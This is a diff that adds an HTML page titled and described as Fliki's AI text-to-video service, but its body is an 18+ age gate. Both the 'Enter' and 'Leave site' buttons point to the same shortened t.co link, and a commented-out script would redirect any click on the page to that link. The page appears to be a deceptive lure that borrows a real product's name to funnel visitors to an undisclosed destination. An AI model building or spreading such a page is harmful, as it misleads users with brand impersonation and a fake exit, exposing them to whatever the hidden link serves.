@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <!-- Meta tags -->
+    <meta name="description" content="Transform your ideas to videos effortlessly with the best AI Video Generator. User-friendly Text to Video editor, realistic voiceovers, dynamic AI clips, and more.">
+    <meta name="keywords" content="">
+    <meta name="author" content="">
+    <meta property="og:title" content="">
+    <meta property="og:description" content="Transform your ideas to videos effortlessly with the best AI Video Generator. User-friendly Text to Video editor, realistic voiceovers, dynamic AI clips, and more.">
+    <meta property="og:image" content="">
+    <meta property="og:url" content="">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <title>Fliki - Turn text into videos with AI voices</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            z-index: -2;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(8px);
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+
+        .popup {
+            max-width: 600px;
+            min-height: 500px;
+            background: white;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Responsive Backgrounds */
+        .background {
+            background-color: #0E161C;
+        }
+
+        .popup {
+            background-color: #1a2c38;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-content: center;
+        }
+
+        .popup p {
+            color: #b1bad3;
+            font-size: 14px;
+        }
+
+        .popup-logo {
+            text-align: center;
+        }
+
+        .popup-logo svg.svel {
+            width: 68px;
+            color: white;
+        }
+
+        .popup-footer {
+            text-align: center;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+        }
+
+        .popup-footer a {
+            padding: 10px;
+            margin: 0 10px;
+            color: #fff;
+        }
+
+        .popup-footer svg {
+            width: 14px;
+        }
+
+        .button-group {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        a.btn {
+            border: none;
+            border-radius: 5px;
+            color: white;
+            padding: 15px 25px;
+            margin: 20px;
+            text-decoration: none;
+        }
+
+        a.enter {
+            background-color: #1475e1;
+            font-weight: bold;
+        }
+
+        a.leave {
+            background-color: #313c42;
+        }
+
+        .popup-img {
+            width: 180px;
+        }
+    </style>
+</head>
+<body>
+<div class="background"></div>
+<div class="overlay"></div>
+<div class="popup">
+    <div class="popup-logo">
+    </div>
+    <div class="popup-body"><img class="popup-img" src="image/18.png">
+        <h2>This website is strictly for individuals who are 18 years of age or older.</h2>
+        <div class="button-group">
+            <a target="_blank" href="https://t.co/eTzKSTCwng" rel="nofollow noopener" class="btn enter"> I am 18 or older - Enter </a>
+            <a target="_blank" href="https://t.co/eTzKSTCwng" rel="nofollow noopener" class="btn leave"> Leave site </a>
+        </div>
+    </div>
+    <div class="popup-footer"></div>
+</div>
+</body>
+<!-- <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('click', function(event) {
+            event.stopPropagation();
+            event.preventDefault();
+            const target = event.target;
+            console.log('Clicked element:', target.tagName);
+
+            if (target.tagName === 'A' ||
+                target.tagName === 'IMG' ||
+                target.tagName === 'path' ||
+                target.tagName === 'rect' ||
+                target.tagName === 'SPAN' ||
+                target.tagName === 'BUTTON' ||
+                target.tagName === 'LI') {
+                window.location.href = 'https://t.co/eTzKSTCwng';
+            }
+        });
+    });
+</script> -->
+</html>
